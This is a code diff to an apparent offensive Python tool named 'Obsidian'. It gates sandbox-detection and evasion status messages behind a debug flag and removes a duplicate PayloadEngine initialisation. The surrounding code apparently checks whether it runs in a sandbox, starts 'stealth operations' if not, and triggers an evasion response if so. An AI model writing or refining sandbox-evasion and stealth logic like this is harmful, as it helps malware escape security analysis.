@@ -52,6 +52,7 @@ def _safe_print(*args, **kwargs):
 
 
 print = _safe_print
+OBSIDIAN_DEBUG = os.getenv("OBSIDIAN_DEBUG", "0") == "1"
 
 
 class AICore:
@@ -4978,10 +4979,12 @@ class AIMovementAndStealth:
         evasion_results = [technique() for technique in self.evasion_techniques.values()]
         
         if all(evasion_results):
-            print("🎯 Environment validated as genuine")
+            if OBSIDIAN_DEBUG:
+                print("🎯 Environment validated as genuine")
             self.initialize_stealth_operations()
         else:
-            print("⚠️ Sandbox detected - initiating evasion")
+            if OBSIDIAN_DEBUG:
+                print("⚠️ Sandbox detected - initiating evasion")
             self.execute_evasion_response()
     def initialize_stealth_operations(self):
         """Initialize stealth operations and establish secure execution environment"""
@@ -7851,7 +7854,6 @@ class LearningEngine:
         self.learning_data = []
         self.PayloadEngine = PayloadEngine()
         self.mutation_history = []
-        self.PayloadEngine = PayloadEngine()
         self.core = None
     def log_ai_learning(self, user_id, action, success, time_taken):
         entry = {
